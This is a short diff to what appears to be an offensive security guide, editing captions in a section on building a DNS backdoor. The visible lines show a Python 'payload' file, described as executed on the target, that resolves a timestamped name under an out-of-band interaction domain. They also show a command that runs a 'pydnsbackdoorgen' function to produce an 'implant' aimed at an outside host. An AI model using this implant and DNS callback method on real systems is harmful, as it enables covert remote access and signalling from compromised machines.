@@ -1976,7 +1976,7 @@ pydnsbackdoorgen() {
 }
 ```
 
-Generate your payload:
+Generate your payload (`egg.py` will get executed on the target):
 ```shell
 cat >egg.py<<-'EOF'
 import time
@@ -1984,7 +1984,7 @@ dns.resolver.resolve(f"{int(time.time())}.yzlespkpfkqfrtwgvhngkyqbuod49rgmo.oast
 EOF
 ```
 
-Generate your implant:
+Generate your implant (and follow the instructions):
 ```shell
 pydnsbackdoorgen b00mpy.team-teso.net egg.py
 ```
